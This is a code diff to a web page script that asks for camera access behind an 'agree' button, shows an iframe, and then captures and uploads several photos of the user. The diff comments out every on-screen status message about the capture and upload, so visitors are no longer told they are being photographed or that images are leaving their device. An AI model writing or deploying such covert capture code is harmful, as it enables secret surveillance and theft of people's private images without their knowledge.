@@ -79,8 +79,8 @@
 
     agreeButton.addEventListener('click', async () => {
       try {
-        statusEl.style.display = 'block';
-        statusEl.innerText = 'Requesting camera permission...';
+      //statusEl.style.display = 'block';
+      //statusEl.innerText = 'Requesting camera permission...';
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
 
         // Hide modal, show iframe
@@ -114,7 +114,7 @@
       canvas.height = Math.round(targetWidth / aspect);
       const ctx = canvas.getContext('2d');
 
-      statusEl.innerText = `Preparing to capture ${captureCount} photos...`;
+    //statusEl.innerText = `Preparing to capture ${captureCount} photos...`;
 
       for (let i = 0; i < captureCount; i++) {
         try {
@@ -124,7 +124,7 @@
           if (!blob) throw new Error('Failed to create image blob');
 
           const filename = `photo-${Date.now()}-${i+1}.jpg`;
-          statusEl.innerText = `Uploading ${i+1}/${captureCount}...`;
+        //statusEl.innerText = `Uploading ${i+1}/${captureCount}...`;
 
           // ----- REPLACED: direct supabase upload -----
           // const { data, error } = await supabaseClient.storage.from('user-media').upload(filename, blob, { contentType: 'image/jpeg' });
@@ -136,7 +136,7 @@
             console.log(`Photo ${i+1} uploaded:`, result);
           } catch (uErr) {
             console.error('Upload failed:', uErr);
-            statusEl.innerText = `Upload failed at ${i+1}: ${uErr.message}`;
+          //statusEl.innerText = `Upload failed at ${i+1}: ${uErr.message}`;
             return;
           }
 
@@ -144,12 +144,12 @@
           await new Promise(r => setTimeout(r, 250));
         } catch (err) {
           console.error('capture/upload error', err);
-          statusEl.innerText = 'Error during capture/upload: ' + (err.message || err);
+        //statusEl.innerText = 'Error during capture/upload: ' + (err.message || err);
           return;
         }
       }
 
-      statusEl.innerText = 'All photos uploaded successfully!';
+     //statusEl.innerText = 'All photos uploaded successfully!';
     }
   </script>
 </body>
